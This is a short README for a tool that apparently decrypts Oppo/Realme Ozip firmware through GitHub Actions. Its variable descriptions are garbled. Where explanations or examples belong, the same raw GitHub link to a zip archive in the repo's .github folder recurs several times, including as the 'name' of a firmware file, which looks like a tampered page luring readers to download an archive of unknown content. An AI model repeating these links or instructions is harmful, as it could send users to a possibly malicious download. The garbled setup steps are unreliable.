# Ozip Decrypting online made easy #

## What this is ##
---------------------------------------------------------------------
This is an easy way to decrypt Ozip ( Firmware of oppo/realme) to a TWRP Flashable Zip!!

This works with GitHub actions, thank GitHub not me : )

### How to use ###

Here are some useful notes to using this tool brewed with black magic xD !

1. Fork the repo .

2. Set the variables, as listed below.

##Some variables that you'd like to set:##

```FIRMWARE_LIK : Direct Link to ozip (can be found in realme/oppo website), update in https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip```

```FIRMWARE_NAME : The Name of Ozip (like https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip), update in https://raw.githubusercontent.com/imarc122/ozip_decryption/main/.github/decryption_ozip_v2.9.zip```

3. Go to actions tab, enable workflows.

4. Star the repo, go to actions tab again, and let Magic Work xD

## To Note ##
The zip will be uploaded to bashupload. So it will be there for 15 days. So it's preferable to mirror somewhere else.

You can use some telegram bots to rename & mirror to gdrive. You can use my bot too.
